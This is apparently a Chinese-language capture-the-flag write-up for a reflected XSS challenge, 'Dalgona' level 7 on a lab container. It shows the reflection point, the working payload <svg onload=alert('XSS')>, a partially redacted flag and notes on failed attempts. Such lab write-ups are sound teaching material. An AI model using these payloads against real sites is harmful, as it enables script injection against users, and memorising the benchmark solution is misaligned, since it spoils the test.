# xben-065-24 · 探索记录

对应题解：[`xben-065-24.md`](./xben-065-24.md)

## 目标与起点

容器 `10.0.172.218:5000`，Dalgona 第 7 关（`xss7.css`）。`/page?name=TESTX` 反射位置：

```html
<input type=text name=name placeholder="Enter your name...">
TESTX
```

是 `<form>` 里的文本节点。

## 第一阶段：直接写标签

```text
name=<svg onload=alert("XSS")>
```

响应出现 `flag{6db156ce-…}`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 默认页（不带 name） | 正常 `Let the game begin` | 基线 |
| 带 `TESTX` | 失败文案里是 `TypeError` | 说明检查器真的在跑 JS，但输入本身没构成执行 |

## 这次真正的收获

1. **文本节点反射是最简单的一类：不需要闭合引号/标签。**
2. **失败文案里的 `TypeError` 是「JS 跑了但 payload 语法错」的信号**，不是服务器错误。
